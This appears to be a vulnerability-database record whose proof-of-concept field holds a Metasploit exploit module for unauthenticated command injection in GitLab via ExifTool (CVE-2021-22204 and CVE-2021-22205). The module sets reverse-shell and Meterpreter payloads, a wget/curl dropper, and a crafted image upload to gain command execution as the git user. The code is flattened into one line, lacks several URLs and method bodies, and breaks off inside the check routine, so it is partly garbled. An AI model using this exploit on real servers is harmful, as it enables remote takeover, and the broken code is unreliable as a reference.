{
    "text": "vul_name : GitLab Unauthenticated Remote ExifTool Command Injection ， vul_cve : CVE-2021-22204 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStager ， super (  ， update_info (  ， info ,  ， 'Name' => 'GitLab Unauthenticated Remote ExifTool Command Injection' ,  ， 'Description' => %q{ ， This module exploits an unauthenticated file upload and command ， injection vulnerability in GitLab Community Edition ( CE ) and ， Enterprise Edition ( EE ) . The patched versions are 13.10.3 , 13.9.6 ,  ， and 13.8.8. ， Exploitation will result in command execution as the git user. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'William Bowling' ,  # Vulnerability discovery and CVE-2021-22204 PoC ， 'jbaines-r7' # Metasploit module ，  ]  ,  ， ' ，  [ 'CVE' , '2021-22205' ]  ,  # GitLab ，  [ 'CVE' , '2021-22204' ]  ,  # ExifTool ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'DisclosureDate' => '2021-04-14' ,  ， 'Platform' => [ 'unix' , 'linux' ]  ,  ， 'Arch' => [ ARCH_CMD , ARCH_X86 , ARCH_X64 ]  ,  ， 'Privileged' => false ,  ， 'Targets' => [  ，  [  ， 'Unix Command' ,  ， { ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'Type' => : unix_cmd ,  ， 'Payload' => { ， 'Space' => 290 ,  ， 'DisableNops' => true ,  ， 'BadChars' => ' # ' ， } ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'cmd/unix/reverse_openssl' ， } ， } ，  ]  ,  ，  [  ， 'Linux Dropper' ,  ， { ， 'Platform' => 'linux' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'Type' => : linux_dropper ,  ， 'CmdStagerFlavor' => [ 'wget' , 'lwprequest' , 'curl' , 'printf' ]  ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' ， } ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 1 ,  ， 'DefaultOptions' => { ， 'MeterpreterTryToFork' => true ， } ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  ， 'SideEffects' => [ IOC_IN_LOGS , ARTIFACTS_ON_DISK ]  ， } ， register_options (  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'Base path' , '/' ]  )  ，  ]  )  ， end ， random_filename = \" # {rand_text_alphanumeric ( 6.12 ) }.jpg\" ， multipart_form = Rex : MIME : Message.new ， multipart_form.add_part (  ， file_data ,  ， 'image/jpeg' ,  ， 'binary' ,  ， \"form-data ; name=\\\"file\\\" ; filename=\\\" # {random_filename}\\\" ， random_uri = normalize_uri ( target_uri.path , rand_text_alphanumeric ( 6.12 )  ， print_status ( \"Uploading # {random_filename} to # {random_uri}\" )  ， send_request_cgi ( { ， 'method' => 'POST' ,  ， 'uri' => random_uri ,  ， 'ctype' => \"multipart/form-data ; boundary= # {multipart_form.bound}\" ,  ， 'data' => multipart_form.to_s ， } , timeout )  ， end ， def check ，  # Checks if the instance is a GitLab install by looking for the ，  # 'About GitLab' footer or a password redirect. If that's successful ，  # a bogus jpg image is uploaded to a bogus URI. The patched versions ，  # should never send the bad image to ExifTool , resulting in a 404. ，  # The unpatched versions should feed the image to the vulnerable ，  # ExifTool , resulting in a 422 error message. ， res = send_request_cgi ( { ， 'method' => 'GET' ,  ， 'uri' => normalize_uri ( target_uri.path , '/users/sign_in' )  ， } )  ， unless res",
    "time": "2021.11.05"
}